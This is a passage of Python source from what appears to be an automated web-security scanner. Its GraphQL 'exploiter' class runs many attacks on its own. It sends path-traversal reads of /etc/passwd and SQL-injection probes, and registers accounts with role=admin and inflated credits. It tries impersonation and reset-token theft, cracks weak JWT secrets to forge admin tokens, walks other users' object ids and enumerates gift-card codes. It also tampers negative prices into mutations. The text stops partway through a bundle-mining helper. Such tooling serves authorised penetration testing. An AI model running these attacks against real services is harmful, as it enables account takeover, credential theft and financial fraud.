# path-traversal (../etc/passwd in file/path args), arg-SQLi (single-quote -> DB error), EXECUTE the
# single-request mutations (register mass-assignment, requestPasswordReset token leak, loginAs impersonation),
# then crack the issued token's weak secret and re-query authed for excessive-data. Fully agnostic: every
# target is chosen by ARG NAME / RETURN-TYPE shape from introspection, never a memorised query name.

_GQL_INTROSPECT = ("{__schema{queryType{name}mutationType{name}types{name kind "
                   "fields{name args{name type{name kind ofType{name kind ofType{name kind}}}}"
                   "type{name kind ofType{name kind ofType{name kind ofType{name kind}}}}}"
                   "inputFields{name type{name kind ofType{name kind ofType{name kind}}}}}}}")
_GQL_SQL_ERR = re.compile(r"sql syntax|unrecognized token|syntax error|unterminated|sqlite|psql|mysql|"
                          r"mariadb|postgres|ora-\d+|incorrect syntax|near \"", re.I)
_GQL_STACK = re.compile(r"stacktrace|traceback|\bat [\w.$/<> ]+\(|/node_modules/", re.I)
_GQL_SENSITIVE = ("passwordhash", "password", "accesstoken", "token", "apikey", "secret", "ssn",
                  "creditcard", "card", "iban", "cvv", "privatekey")
_GQL_FILEARG = ("file", "path", "doc", "document", "template", "report", "filename", "filepath")
_GQL_QARG = ("q", "query", "search", "term", "keyword", "filter")
# Private/owned-resource nouns: a distinct-object-per-id walk is only IDOR on an OWNED resource, not on a
# public catalog (item/shop/article/review). Agnostic noun set - which side a field lands on is by name.
_GQL_PRIVATE = ("order", "invoice", "user", "account", "payment", "note", "message", "favorite", "wishlist",
                "cart", "address", "ticket", "booking", "subscription", "profile", "transfer", "refund",
                "notification", "invitation", "invite", "credit", "wallet")


def _gql_unwrap(t):
    seen = 0
    while isinstance(t, dict) and t.get("ofType") and seen < 6:
        t = t["ofType"]
        seen += 1
    return (t or {}).get("name") if isinstance(t, dict) else None


def _gql_scalar_subfields(types: dict, type_name: str) -> list:
    t = types.get(type_name)
    if not t or t.get("kind") not in ("OBJECT", "INTERFACE"):
        return []
    out = []
    for f in (t.get("fields") or []):
        rt = types.get(_gql_unwrap(f.get("type")))
        if not rt or not rt.get("fields"):        # a leaf: its type has no sub-fields
            out.append(f["name"])
    return out


def _gql_selection_for(types: dict, ret_type: str) -> str:
    """A valid selection set for an object return type: id/username/email + sensitive scalar subfields. When
    the type has few/no useful scalars (e.g. Invitation, whose PII sits under a nested `invitee{...}`), add a
    ONE-LEVEL nested selection of its no-arg object subfields so the query is valid AND surfaces nested PII."""
    subs = _gql_scalar_subfields(types, ret_type)
    sens = [s for s in subs if s.lower() in _GQL_SENSITIVE or any(k in s.lower() for k in _GQL_SENSITIVE)]
    pick = [c for c in ("id", "username", "email") if c in subs] + sens
    final = list(dict.fromkeys(pick))
    if len(final) < 2:                                    # thin scalars -> reach one level into object subfields
        t = types.get(ret_type) or {}
        for f in (t.get("fields") or []):
            if f.get("args"):
                continue
            inner = _gql_scalar_subfields(types, _gql_unwrap(f.get("type")))
            keep = [s for s in inner if s.lower() in ("id", "username", "email")
                    or s.lower() in _GQL_SENSITIVE or any(k in s.lower() for k in _GQL_SENSITIVE)]
            if keep:
                final.append(f"{f['name']}{{{' '.join(dict.fromkeys(keep[:4]))}}}")
            if len(final) >= 3:
                break
    if not final:
        final = subs[:3]
    return "{" + " ".join(final) + "}" if final else ""


def _dummy_str(field_name: str) -> str:
    """A throwaway value for a required String field - RANDOM each run so a register/create doesn't collide
    with a value a previous run already inserted (which would fail and hide a mass-assignment)."""
    r = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"zzq{r}@example.com" if "email" in field_name.lower() else f"zzq{r}"


def _code_neighbors(code: str, span: int = 4) -> list:
    """Sequential neighbours of a REAL code by mutating its trailing number - agnostic to prefix/format
    (works for `GC-00042`, `V0007`, `CARD_113`...). This is how enumeration should work: seed a real code,
    walk its neighbours - not guess a hardcoded prefix."""
    m = re.search(r"^(.*?)(\d+)(\D*)$", code.strip())
    if not m:
        return []
    pre, num, suf = m.group(1), m.group(2), m.group(3)
    width, base = len(num), int(num)
    out = []
    for d in list(range(1, span + 1)) + list(range(-span, 0)):
        v = base + d
        if v >= 0:
            out.append(f"{pre}{str(v).zfill(width)}{suf}")
    return out


_CODE_RE = re.compile(r'"(?:code|giftCard|voucher|coupon|giftCode)"\s*:\s*"([A-Za-z0-9][A-Za-z0-9._-]{3,30})"', re.I)


class _GqlExploiter:
    """Runs the schema-guided exploitation stages against one GraphQL endpoint. `post(query, extra_headers)`
    returns the response body text; findings/tokens accumulate on the instance."""

    def __init__(self, post, cands: list, dbg=lambda *a: None):
        self.post = post
        self.cands = cands
        self.dbg = dbg
        self.findings: list = []
        self.tokens: list = []
        self.refresh_tokens: list = []
        self.codes: list = []
        self.usernames: list = []

    def _q(self, query, extra_headers=None):
        body = self.post(query, extra_headers or [])
        for m in _JWT_RE.findall(body or ""):
            if m not in self.tokens:
                self.tokens.append(m)
            try:                                          # a refresh token identifies itself in its payload
                if json.loads(_b64url_decode(m.split(".")[1])).get("type") == "refresh" and m not in self.refresh_tokens:
                    self.refresh_tokens.append(m)
            except Exception:  # noqa: BLE001
                pass
        for m in _CODE_RE.findall(body or ""):          # remember real gift-card/voucher codes we see
            if m not in self.codes:
                self.codes.append(m)
        for m in re.findall(r'"username"\s*:\s*"([A-Za-z0-9_.@-]{2,30})"', body or ""):   # real usernames
            if m not in self.usernames:
                self.usernames.append(m)
        return body or ""

    def _add(self, sev, title, url, evidence):
        self.findings.append({"severity": sev, "title": title, "url": url, "evidence": str(evidence)[:160]})

    def run(self, url, schema):
        types = {t["name"]: t for t in (schema.get("types") or []) if t.get("name")}
        qname = ((schema.get("queryType") or {}).get("name")) or "Query"
        mname = ((schema.get("mutationType") or {}).get("name"))
        qfields = (types.get(qname, {}) or {}).get("fields") or []
        mfields = (types.get(mname, {}) or {}).get("fields") or [] if mname else []
        self.mfields = mfields
        try:
            self._injection_sweep(url, types, qfields)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql injection sweep err: {e}")
        try:
            self._exec_mutations(url, types, mfields)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql mutations err: {e}")
        admin_hdr = None
        try:
            admin_hdr = self._forge_from_tokens(url)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql forge err: {e}")
        try:
            self._excessive_and_bola(url, types, qfields, admin_hdr)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql excessive/bola err: {e}")
        try:
            self._build_typed_id_pool(types, qfields, admin_hdr)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql id-pool err: {e}")
        try:
            self._biz_logic(url, types, mfields, admin_hdr)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql biz-logic err: {e}")
        try:
            self._user_enum(url, types, mfields)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql user-enum err: {e}")
        try:
            self._token_refresh(url, types, mfields)
        except Exception as e:  # noqa: BLE001
            self.dbg(f"gql token-refresh err: {e}")
        return self.findings

    def _token_refresh(self, url, types, mfields):
        """Exchange a refresh token for a fresh access token (know HOW to refresh, to keep a live token on a
        long scan) and detect refresh-NO-ROTATION single-run: the SAME refresh token still works on a 2nd call."""
        rtok = (self.refresh_tokens[:1] or [None])[0]
        if not rtok:
            return
        for f in mfields:
            if "refresh" not in f["name"].lower():
                continue
            args = f.get("args") or []
            rarg = next((a["name"] for a in args if "refresh" in a["name"].lower() or "token" in a["name"].lower()), None)
            if not rarg:
                continue
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            got1 = bool(_JWT_RE.search(self._q(self._mutation_call(f, {rarg: rtok}, leaf))))
            got2 = bool(_JWT_RE.search(self._q(self._mutation_call(f, {rarg: rtok}, leaf))))   # reuse SAME token
            if got1 and got2:
                self._add("medium", f"GraphQL refresh token not rotated (replayable via {f['name']})", url,
                          "the same refresh token keeps minting access tokens after use - no rotation/revocation")
            return

    def _user_enum(self, url, types, mfields):
        """User enumeration: a login/register that responds DIFFERENTLY for a real vs a fake account leaks
        which accounts exist. Diff login(real-username, wrong-pw) vs login(random, wrong-pw)."""
        real = (self.usernames[:1] or ["admin"])[0]              # a username we actually saw (else common default)
        fake = "zzq" + "".join(random.choices(string.ascii_lowercase, k=10))
        for f in mfields:
            n = f["name"].lower()
            if n != "login" and "signin" not in n:
                continue
            args = f.get("args") or []
            if not any(a["name"].lower() in ("username", "email", "user", "login") for a in args):
                continue
            uarg = next(a["name"] for a in args if a["name"].lower() in ("username", "email", "user", "login"))
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            b_real = self._q(self._mutation_call(f, {uarg: real, "password": "zzWrongPw!1"}, leaf))
            b_fake = self._q(self._mutation_call(f, {uarg: fake, "password": "zzWrongPw!1"}, leaf))
            if _enum_body_key(b_real) != _enum_body_key(b_fake):     # materially different -> enumerable
                self._add("medium", f"GraphQL user enumeration via {f['name']} (distinct real-vs-fake response)",
                          url, f"login('{real}') != login('<random>') - reveals which accounts exist")
                return

    def _build_typed_id_pool(self, types, qfields, admin_hdr):
        """Real object ids KEYED BY TYPE so the biz-logic pass can fill `itemId`/`orderId`/`shopId` with an id
        of the RIGHT kind (a user uuid won't resolve as an itemId). Queries no-arg list fields, plus one 2-hop
        (an items-style field taking a shopId, seeded from the shop list). Introspection-driven, no hardcoding."""
        hdr = admin_hdr or []
        pool: dict = {}

        def _collect(fname, body):
            noun = fname.lower().rstrip("s")
            for i in re.findall(r'"id"\s*:\s*"?([0-9a-fA-F][0-9a-fA-F-]{1,40})"?', body)[:4]:
                pool.setdefault(noun, [])
                if i not in pool[noun]:
                    pool[noun].append(i)

        for f in qfields:
            # allow fields whose args are all OPTIONAL (a nullable arg like recentUsers(limit:Int) is fine -
            # _field_call fills a default); skip only when a REQUIRED (NON_NULL) arg is present.
            if any((a.get("type") or {}).get("kind") == "NON_NULL" for a in (f.get("args") or [])):
                continue
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            if leaf and "id" in leaf:
                _collect(f["name"], self._q(self._field_call(f["name"], {}, f.get("args") or [], leaf), hdr))
        # 2-hop: a field taking a shopId (item list) - seed it from a shop id we just got
        shop_ids = next((v for k, v in pool.items() if "shop" in k), [])
        if shop_ids:
            for f in qfields:
                args = f.get("args") or []
                if any(a["name"].lower() == "shopid" for a in args):
                    leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
                    if leaf and "id" in leaf:
                        _collect(f["name"], self._q(self._field_call(f["name"], {"shopId": shop_ids[0]}, args, leaf), hdr))
        self.id_pool = pool

    def _typed_id(self, arg_name, default):
        """Pick a real id whose TYPE matches the arg (itemId->item pool, orderId->order, userId->user)."""
        noun = arg_name.lower()
        noun = noun[:-2] if noun.endswith("id") else noun
        noun = noun[2:] if noun.startswith("to") else noun          # toUserId -> user
        noun = noun.strip("_") or ""
        for pk, ids in getattr(self, "id_pool", {}).items():
            if noun and (noun in pk or pk in noun) and ids:
                return ids[0]
        return default

    # mechanical single-request business-logic value tampering (the class the model reliably skips - the
    # same tamper-and-check the REST biz-logic backstop does on spec'd APIs, driven here by mutation ARG name)
    _BIZ_TAMPER = (   # (arg-name substrings, tampered value, human label) - negative is universally abusive
        (("total", "amount", "subtotal", "grandtotal", "cost", "fee", "charge", "sum"), -1, "negative total/amount"),
        (("price", "unitprice"), -1, "negative price"),
        (("qty", "quantity", "count", "units"), -1, "negative quantity"),
        (("stock",), -1, "negative stock"),
        (("discount", "percent", "percentage"), 110, "discount>100"),
        (("credit", "balance", "points", "wallet", "refund"), -100, "negative credits/refund"),
    )

    _MONEY_FIELDS = ("total", "amount", "price", "subtotal", "cost", "fee", "quantity", "qty", "stock",
                     "discount", "credits", "balance", "wallet", "points", "refunded")

    def _dummy_input(self, types, type_name, depth=0):
        """Build a dummy value for an INPUT_OBJECT arg (fill required scalars) so a mutation validates."""
        t = types.get(type_name)
        if not t or t.get("kind") != "INPUT_OBJECT" or depth > 2:
            return None
        obj = {}
        for inf in (t.get("inputFields") or []):
            fn, ft = inf["name"], _gql_unwrap(inf.get("type"))
            if ft == "String":
                obj[fn] = _dummy_str(fn)
            elif ft == "Int":
                obj[fn] = 1
            elif ft == "Float":
                obj[fn] = 1.0
            elif ft == "Boolean":
                obj[fn] = True
            elif types.get(ft, {}).get("kind") == "INPUT_OBJECT":
                sub = self._dummy_input(types, ft, depth + 1)
                if sub is not None:
                    obj[fn] = sub
        return obj

    def _biz_leaf(self, types, ret_type):
        """A selection that INCLUDES money/qty scalar fields so a trusted tampered value is visible."""
        subs = _gql_scalar_subfields(types, ret_type)
        if not subs:
            return ""
        pick = [s for s in subs if s.lower() in self._MONEY_FIELDS or any(m in s.lower() for m in self._MONEY_FIELDS)]
        pick = (["id"] if "id" in subs else []) + pick
        return "{" + " ".join(dict.fromkeys(pick or subs[:2])) + "}"

    def _biz_logic(self, url, types, mfields, admin_hdr):
        hdr = admin_hdr or []
        real_id = (getattr(self, "seed_ids", None) or ["1"])[0]
        for f in mfields:
            args = f.get("args") or []
            tampered = None
            for a in args:
                an = a["name"].lower()
                if _gql_unwrap(a.get("type")) not in ("Int", "Float"):
                    continue
                for names, val, label in self._BIZ_TAMPER:
                    if any(n in an for n in names):
                        tampered = (a["name"], val, label)
                        break
                if tampered:
                    break
            if not tampered:
                continue
            aname, aval, label = tampered
            argvals = {aname: aval}
            for a in args:                                # fill the OTHER args so the mutation validates
                if a["name"] == aname:
                    continue
                an = a["name"].lower()
                at = _gql_unwrap(a.get("type"))
                if an == "id" or an.endswith("id"):       # a real object id of the RIGHT TYPE ("1" won't resolve)
                    # a bare `id` is typed by the mutation's RETURN type (updateItem->Item => an item id)
                    hint = (_gql_unwrap(f.get("type")) or "id") if an == "id" else a["name"]
                    argvals[a["name"]] = (self.codes[:1] or [real_id])[0] if "code" in an else self._typed_id(hint, real_id)
                elif types.get(at, {}).get("kind") == "INPUT_OBJECT":
                    d = self._dummy_input(types, at)
                    if d is not None:
                        argvals[a["name"]] = d
            leaf = self._biz_leaf(types, _gql_unwrap(f.get("type")))
            body = self._q(self._mutation_call(f, argvals, leaf), hdr)
            low = body.lower()
            errored = '"errors"' in low
            succeeded = bool(re.search(rf'"{re.escape(f["name"])}"\s*:\s*[\{{\[]', body))   # returned an object/array, not null
            reflects = bool(re.search(rf'"[a-z]*(?:total|price|amount|qty|quantity|discount|credit|stock)[a-z0-9]*"'
                                      rf'\s*:\s*-?{re.escape(str(abs(aval)))}\b', body, re.I))
            # a NEGATIVE money/qty value that the server accepted (mutation succeeded, no error) is a flaw by
            # itself; a positive tamper (discount>100) needs the value REFLECTED to be sure it was trusted.
            confirmed = succeeded and not errored and (reflects or aval < 0)
            if confirmed:
                self._add("high", f"GraphQL business logic: {f['name']} trusts client {label}", url,
                          f"mutation accepted tampered {aname}={aval} without server-side re-validation")

    def _field_call(self, fname, argvals, all_args, leaf):
        parts = []
        for a in all_args:
            an = a["name"]
            if an in argvals:
                parts.append(f'{an}:{json.dumps(argvals[an])}')
            else:
                at = _gql_unwrap(a.get("type"))
                if at == "Int":
                    parts.append(f'{an}:1')
                elif at in ("ID", "String"):
                    parts.append(f'{an}:"1"')
        argstr = ("(" + ",".join(parts) + ")") if parts else ""
        return "{ %s%s %s }" % (fname, argstr, leaf)

    def _injection_sweep(self, url, types, qfields):
        verbose = False
        for f in qfields:
            args = f.get("args") or []
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            for a in args:
                an = a["name"].lower()
                at = _gql_unwrap(a.get("type"))
                if at not in ("String", "ID"):
                    continue
                if any(k in an for k in _GQL_FILEARG):
                    body = self._q(self._field_call(f["name"], {a["name"]: "../../../../etc/passwd"}, args, leaf))
                    if "root:x:0:0" in body:
                        self._add("high", f"GraphQL path traversal in {f['name']}({a['name']}:)", url,
                                  "arg=../etc/passwd returned /etc/passwd")
                body = self._q(self._field_call(f["name"], {a["name"]: "'"}, args, leaf))
                if _GQL_SQL_ERR.search(body):
                    self._add("high", f"GraphQL SQL injection in {f['name']}({a['name']}:)", url,
                              f"single-quote -> DB error: {_GQL_SQL_ERR.search(body).group(0)}")
                    if not verbose and _GQL_STACK.search(body):
                        self._add("medium", "GraphQL verbose errors (stack traces in extensions)", url,
                                  "resolver errors return a full stacktrace")
                        verbose = True

    def _mutation_call(self, f, argvals, leaf):
        parts = []
        for a in (f.get("args") or []):
            an = a["name"]
            at = _gql_unwrap(a.get("type"))
            if an in argvals:
                v = argvals[an]
                if isinstance(v, dict):
                    inner = ",".join(f'{k}:{json.dumps(vv)}' for k, vv in v.items())
                    parts.append(f'{an}:{{{inner}}}')
                else:
                    parts.append(f'{an}:{json.dumps(v)}')
            elif at == "Int":
                parts.append(f'{an}:1')
            elif at in ("ID", "String"):
                parts.append(f'{an}:"1"')
            elif at == "Float":
                parts.append(f'{an}:1.0')
            elif at == "Boolean":
                parts.append(f'{an}:true')
        argstr = ("(" + ",".join(parts) + ")") if parts else ""
        return "mutation { %s%s %s }" % (f["name"], argstr, leaf)

    def _exec_mutations(self, url, types, mfields):
        for f in mfields:
            n = f["name"].lower()
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            if n.startswith("register") or n in ("signup",):
                self._try_register(url, f, types, leaf)
            elif "loginas" in n or "impersonate" in n or "switchuser" in n or "assumeuser" in n:
                body = self._q(self._mutation_call(f, {"userId": "1"}, leaf))
                if _JWT_RE.search(body):
                    self._add("high", f"GraphQL impersonation via {f['name']} (mints a token, no admin check)",
                              url, "unauth call returned an access token")
            elif ("reset" in n and "request" in n) or "forgot" in n:
                body = self._q(self._mutation_call(f, {"username": "admin", "email": "admin@example.com"},
                                                   leaf or "{token}"))
                if re.search(r'"(token|reset_?token|code)"\s*:\s*"[^"]{6,}"', body, re.I) or \
                   re.search(r'\breset[:=][A-Za-z0-9+/=_-]{6,}', body):
                    self._add("high", f"GraphQL weak/leaked reset via {f['name']} (token returned in response)",
                              url, "reset token echoed to caller (should be emailed only)")
            elif n == "login":
                self._q(self._mutation_call(f, {"username": "admin", "password": "adminpass"}, leaf))

    def _try_register(self, url, f, types, leaf):
        inputvals, injected = {}, []
        for a in (f.get("args") or []):
            at = _gql_unwrap(a.get("type"))
            it = types.get(at)
            if it and it.get("kind") == "INPUT_OBJECT":
                obj = {}
                for inf in (it.get("inputFields") or []):
                    fn, ft = inf["name"], _gql_unwrap(inf.get("type"))
                    low = fn.lower()
                    if low == "role":
                        obj[fn] = "admin"
                        injected.append(fn)
                    elif low in ("isadmin", "admin"):
                        obj[fn] = True
                        injected.append(fn)
                    elif "credit" in low or "balance" in low or "wallet" in low:
                        obj[fn] = 999999
                        injected.append(fn)
                    elif ft == "String":
                        obj[fn] = _dummy_str(fn)          # RANDOM per run - a fixed value would collide
                    elif ft == "Int":
                        obj[fn] = 1
                    elif ft == "Boolean":
                        obj[fn] = True
                    elif ft == "Float":
                        obj[fn] = 1.0
                inputvals[a["name"]] = obj
            elif at == "String":
                inputvals[a["name"]] = _dummy_str(a["name"])
        body = self._q(self._mutation_call(f, inputvals, leaf))
        tok_admin = False
        for m in _JWT_RE.findall(body):
            try:
                pl = json.loads(_b64url_decode(m.split(".")[1]))
                if str(pl.get("role", "")).lower() == "admin" or pl.get("is_admin") or pl.get("admin"):
                    tok_admin = True
            except Exception:  # noqa: BLE001
                pass
        if injected and (tok_admin or re.search(r'"role"\s*:\s*"admin"', body, re.I)):
            self._add("high", f"GraphQL mass-assignment via {f['name']} (client set role=admin/credits)", url,
                      f"injected {injected}; issued identity carries role=admin")
        elif injected and _JWT_RE.search(body):
            self._add("high", f"GraphQL mass-assignment via {f['name']} (privileged input fields accepted)", url,
                      f"register accepted injected fields {injected} and issued a token")

    def _forge_from_tokens(self, url):
        for jwt in self.tokens[:8]:
            sec = _jwt_crack(jwt, self.cands)
            if sec:
                forged = _jwt_forge_admin(jwt, sec)
                self._add("high", "Weak JWT signing secret - HS256 token forgeable (admin impersonation)", url,
                          f"a captured GraphQL token verifies under a guessable secret [redacted len {len(sec)}]")
                return [f"Authorization: Bearer {forged}"]
        # no crack, but a login/register token is still an authenticated identity to reuse
        return [f"Authorization: Bearer {self.tokens[0]}"] if self.tokens else None

    def _excessive_and_bola(self, url, types, qfields, admin_hdr):
        hdr = admin_hdr or []
        ids = []
        for f in qfields:
            if f.get("args"):
                continue
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            if not leaf or "id" not in leaf:
                continue
            body = self._q("{ %s %s }" % (f["name"], leaf), hdr)
            for m in re.findall(r'"id"\s*:\s*"?([0-9a-fA-F-]{1,40})"?', body):
                if m not in ids:
                    ids.append(m)
            if re.search(r'"(passwordHash|accessToken)"\s*:\s*"[^"]{3,}"', body):
                self._add("high", f"GraphQL excessive data: {f['name']} exposes credentials/token", url,
                          "response includes passwordHash / accessToken")
        walk_ids = ids[:3] or ["1", "2", "3"]
        self.seed_ids = ids[:3]                           # real object ids for the biz-logic pass to reuse
        for f in qfields:
            args = f.get("args") or []
            idargs = [a for a in args if a["name"].lower() == "id" or a["name"].lower().endswith("id")]
            if not idargs:
                continue
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            if not leaf:
                continue
            sens, distinct = False, set()
            for idv in walk_ids:
                body = self._q(self._field_call(f["name"], {idargs[0]["name"]: idv}, args, leaf), hdr)
                if re.search(r'"(passwordHash|accessToken|password)"\s*:\s*"[^"]{3,}"', body):
                    sens = True
                if '"id"' in body:
                    distinct.add(body[:120])
            if sens:
                self._add("high", f"GraphQL BOLA + excessive data: {f['name']}({idargs[0]['name']}:) exposes "
                          "any user's creds", url, "walking ids returns other principals' passwordHash/accessToken")
            elif len(distinct) >= 2 and any(k in f["name"].lower() for k in _GQL_PRIVATE):
                self._add("high", f"GraphQL BOLA/IDOR: {f['name']}({idargs[0]['name']}:) returns other objects",
                          url, f"{len(distinct)} distinct owned objects across walked ids")
        for f in qfields:                                 # sequential-code enum (gift cards / vouchers)
            code_args = [a for a in (f.get("args") or [])
                         if a["name"].lower() in ("code", "voucher", "coupon", "gift", "giftcode")]
            if not code_args:
                continue
            leaf = _gql_selection_for(types, _gql_unwrap(f.get("type")))
            # SEED a REAL code (so we don't rely on a hardcoded prefix): execute a buy/issue/create-gift
            # mutation if one exists - its response gives a real code, and _q collects it into self.codes.
            if not self.codes:
                for mf in (self.mfields or []):
                    mn = mf["name"].lower()
                    if any(k in mn for k in ("buy", "purchase", "create", "issue", "redeem")) \
                            and any(g in mn for g in ("gift", "card", "voucher", "coupon")):
                        self._q(self._mutation_call(mf, {}, _gql_selection_for(types, _gql_unwrap(mf.get("type")))), hdr)
            # candidates: neighbours of the REAL codes first (agnostic to format), then hardcoded hints as fallback
            candidates = [c for real in self.codes[:3] for c in _code_neighbors(real)]
            candidates += [fmt % i for i in range(1, 4) for fmt in ("GC-%05d", "GC-%06d", "%05d")]
            hits = 0
            for cand in list(dict.fromkeys(candidates))[:24]:
                body = self._q(self._field_call(f["name"], {code_args[0]["name"]: cand}, f.get("args") or [], leaf), hdr)
                if re.search(r'"(balance|amount|value)"\s*:', body):
                    hits += 1
            if hits >= 2:
                self._add("high", f"GraphQL enumerable codes: {f['name']}({code_args[0]['name']}:) (sequential)",
                          url, f"{hits} codes resolved by walking a real code's neighbours")


# iter33: cross-origin API support - a SPA's UI and its API often live on DIFFERENT hosts (ui on test.com,
# API on api.whatever.com). The bundle hardcodes the API base as an ABSOLUTE url, so mine it and treat the
# app's OWN backend host as in-scope too. Conservative: only the app's own backend (same registrable domain,
# or an api/backend/gateway-style subdomain), never third-party hosts (analytics/CDN/payment/etc.).
_THIRD_PARTY = ("google", "gstatic", "googleapis", "cloudflare", "cloudfront", "akamai", "fastly", "jsdelivr",
                "unpkg", "cdnjs", "bootstrapcdn", "stripe", "sentry", "segment", "amplitude", "mixpanel",
                "intercom", "hotjar", "doubleclick", "facebook", "fbcdn", "twitter", "linkedin", "youtube",
                "gravatar", "recaptcha", "analytics", "googletagmanager", "cdn.", "fonts.", "static.cloud")
_BACKEND_SUB = ("api", "apis", "backend", "back-end", "bff", "gw", "gateway", "server", "srv", "rest",
                "graphql", "gql", "data", "core", "svc", "service", "services", "app", "internal")


def _registrable(host: str) -> str:
    parts = (host or "").lower().split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else (host or "").lower()


def _app_backend_origins(cache: dict, base_url: str) -> list:
    """Absolute API base origins the app itself calls, on a DIFFERENT host than the UI - mined from bundles /
    responses. Returns [scheme://host] for the app's own backend(s) only (skips third-party hosts)."""
    ui_host = (urlparse(base_url).hostname or "").lower()
    ui_reg = _registrable(ui_host)
    origins, seen = [], set()
    for key, out in cache.items():
        if not key or key[0] not in ("http-request", "js-endpoints", "katana-crawl") or not out:
            continue
        for m in re.finditer(r'https?://([a-zA-Z0-9.-]+)(/[A-Za-z0-9_./-]*)?', out):
            h = m.group(1).lower()
            path = (m.group(2) or "").lower()
            if h == ui_host or h in seen:
                continue
            if any(tp in h for tp in _THIRD_PARTY):
                continue
            sub = h.split(".")[0]
            is_own = _registrable(h) == ui_reg              # same registrable domain (api.test.com <- test.com)
            is_apiish = sub in _BACKEND_SUB or any(b in h for b in ("api", "backend", "gateway", "graphql"))
            looks_api = any(p in path for p in ("/api", "/graphql", "/v1", "/v2", "/rest", "/gql", "/query"))
            # in scope if it's the same registrable domain, an api-ish host, OR a (non-3p) host the app calls
            # with an API-shaped path (covers a bare sibling domain: ui=test.com, backend=whatever.com/api).
            if is_own or is_apiish or looks_api:
                seen.add(h)
                origins.append(f"{urlparse(base_url).scheme or 'https'}://{h}")
    return origins


def _find_graphql_endpoint(cache: dict, base_url: str, headers: list, debug: bool) -> str:
    """The /graphql URL: prefer one graphql-detect already confirmed; else probe base + any app-backend
    origin (the API may be cross-origin) + /graphql."""
    for key, out in cache.items():
        if not key or not out:
            continue
        if key[0] in ("graphql-detect", "graphql-audit"):
            try:
                data = json.loads(out).get("data") or []
            except Exception:  # noqa: BLE001
                data = []
            for d in data:
                if isinstance(d, str) and "graphql" in d.lower() and d.startswith("http"):
                    return d
            if key[0] == "graphql-audit" and len(key) >= 2 and isinstance(key[1], str):
                return key[1]
    # fallback probe: the UI host AND any cross-origin backend host the app itself references
    for origin in [base_url] + _app_backend_origins(cache, base_url):
        cand = origin.rstrip("/") + "/graphql"
        raw = _call(["http-request", cand, "-D", json.dumps({"query": "{__typename}"}),
                     "-H", "Content-Type: application/json"], headers, debug)
        try:
            body = str(((json.loads(raw).get("data") or [{}])[0] or {}).get("content") or "")
            if "__typename" in body or "errors" in body:
                return cand
        except Exception:  # noqa: BLE001
            pass
    return ""


def _graphql_exploit_backstop(cache: dict, headers: list, base_url: str, debug: bool) -> list:
    """Deterministic schema-guided GraphQL exploitation. Silent unless a GraphQL endpoint is present."""
    url = _find_graphql_endpoint(cache, base_url, headers, debug)
    if not url:
        return []
    raw = _call(["http-request", url, "-D", json.dumps({"query": _GQL_INTROSPECT}),
                 "-H", "Content-Type: application/json"], headers, debug)
    try:
        body = str(((json.loads(raw).get("data") or [{}])[0] or {}).get("content") or "")
        schema = json.loads(body).get("data", {}).get("__schema")
    except Exception:  # noqa: BLE001
        schema = None
    if not isinstance(schema, dict) or not schema.get("types"):
        return []                                         # introspection disabled -> nothing to guide us
    debug_print(f"bob :: graphql-exploit backstop: introspected {len(schema.get('types') or [])} types on {url}")
    cands = _jwt_secret_candidates(base_url, cache)

    def _post(query, extra_headers):
        argv = ["http-request", url, "-D", json.dumps({"query": query}), "-H", "Content-Type: application/json"]
        for h in extra_headers:
            argv += ["-H", h]
        raw = _call(argv, headers, debug)
        try:
            return str(((json.loads(raw).get("data") or [{}])[0] or {}).get("content") or "")
        except Exception:  # noqa: BLE001
            return ""

    ex = _GqlExploiter(_post, cands, dbg=lambda *a: debug_print("bob :: " + " ".join(str(x) for x in a)))
    out = ex.run(url, schema)
    for f in out:                                        # normalise the weak-secret row so it dedups with the
        if "weak jwt signing secret" in str(f.get("title", "")).lower():   # standalone jwt backstop's row
            f["url"] = base_url
    return out


# iter25: REST route-fragment mining + REST exploitation backstop ---------------------------------
# A spec-less SPA hides its API: the built JS bundle references routes as BARE FRAGMENTS ('/login-as',
# '/password/forgot', '/giftcards') that the app prepends an API base to at runtime - so a plain endpoint
# scrape (which only catches fully-qualified '/api/...') misses most of them. This miner pulls the bare
# fragments out of the bundles and re-attaches the detected base, then a REST exploitation pass runs the
# same schema-of-vulns the GraphQL backstop does, but over REST paths. Agnostic: routes are classified by
# path NOUN, never a hardcoded target path.

_REST_FRAG_RE = re.compile(r"""["'`](/[a-zA-Z][A-Za-z0-9_./:{}$-]{2,60})""")  # no closing quote: a `?query` or `${x}` ends the literal
_REST_NOUN = ("login", "register", "signup", "user", "order", "search", "help", "giftcard", "gift",
              "checkout", "credit", "refund", "seller", "item", "shop", "review", "password", "reset",
              "recent", "webhook", "invoice", "favorite", "profile", "cart", "coupon", "article", "invite",
              "upload", "notify", "admin", "account", "me", "auth", "impersonate", "voucher", "transfer")


def _script_srcs(cache: dict, base_url: str) -> list:
    """<script src> bundle URLs from the cached base page + any discovered .js in the crawl."""
    scheme = urlparse(base_url).scheme or "https"
    host = (urlparse(base_url).hostname or "").lower()
    srcs = []
    for key, out in cache.items():
        if not key or key[0] != "http-request" or not out:
            continue
        try:
            body = str((((json.loads(out).get("data") or [{}]) or [{}])[0] or {}).get("content") or "")
        except Exception:  # noqa: BLE001
            continue
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js)["\']', body, re.I):
            u = m.group(1)
            if u.startswith("//"):
                u = scheme + ":" + u
            elif u.startswith("/"):
                u = f"{scheme}://{host}{u}"
            elif not u.startswith("http"):
                u = f"{scheme}://{host}/{u}"
            if (urlparse(u).hostname or "").lower() == host and u not in srcs:
                srcs.append(u)
